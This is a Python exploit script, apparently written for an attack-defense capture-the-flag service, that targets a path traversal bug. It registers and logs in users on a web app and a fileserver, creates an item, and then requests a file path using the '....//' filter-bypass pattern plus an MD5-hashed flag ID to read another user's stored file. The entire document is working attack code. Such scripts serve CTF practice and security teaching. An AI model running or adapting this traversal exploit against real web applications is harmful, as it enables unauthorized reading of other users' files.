import sys
import string
import random
import base64
import requests
import hashlib

"""

This is the exploit script for vulnerability 4 (Path Traversal)
This program takes 2 arguments:

- ip-address
- flagid for this flagstore

"""

def randomString():
    name = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for _ in range(8))
    return name

def exploit(ip, hashed_email):
    s = requests.Session()
    wbase = f"http://{ip}:10100"
    fbase = f"http://{ip}:10101"

    name = randomString()
    email = f"{name}@{name}.com"
    password = "password"
    r = s.post(wbase + "/register", data={
                                    "email": email,
                                    "username": name,
                                    "password": password})
    if r.status_code != 200:
        print("Failed to register exploit user")
        sys.exit(1)
    r = s.post(wbase + "/login", data = {
                                    "email": email,
                                    "password": password
    })
    if r.status_code != 200:
        print("Failed to register exploit user")
        sys.exit(1)
    
    # have to register a fileserver user so a directory with md5(email) exists
    r = s.post(fbase + "/auth/register", data={
                                    "email": email,
                                    "username": name,
                                    "password": password})
    if r.status_code != 200:
        print("Failed to register exploit user")
        sys.exit(1)
    r = s.post(fbase + "/auth/login", data={
                                    "email": email,
                                    "password": password})
    if r.status_code != 200:
        print("Failed to register exploit user")
        sys.exit(1)
    # have to create an item so it can point into our fileserver directory
    r = s.post(wbase + "/item/create", data={
                                    "title": "idek bro",
                                    "filename": "anything.jpeg",
                                    "stock": 1})
    item_id = r.history[0].headers["ITEM_ID"]

    r = s.get(wbase + f"/item/view?id={item_id}&file=....//{hashed_email}/flag.jpg")
    flag = r.text
    return flag

if __name__ == '__main__':
    args = sys.argv[1:]
    if len(args) > 2:
        print("Too many arguments.\n Try exploit4.py <ip> <flag-ID>")
        sys.exit(1)

    if len(args) == 0:
        print("Run like: pipenv run python exploit4.py <ip> <flag-ID>")
        sys.exit(1)

    ip = args[0]
    hashed_email = hashlib.md5(args[1].encode()).hexdigest() # hashed email
    flag = exploit(ip, hashed_email)
    print(flag)
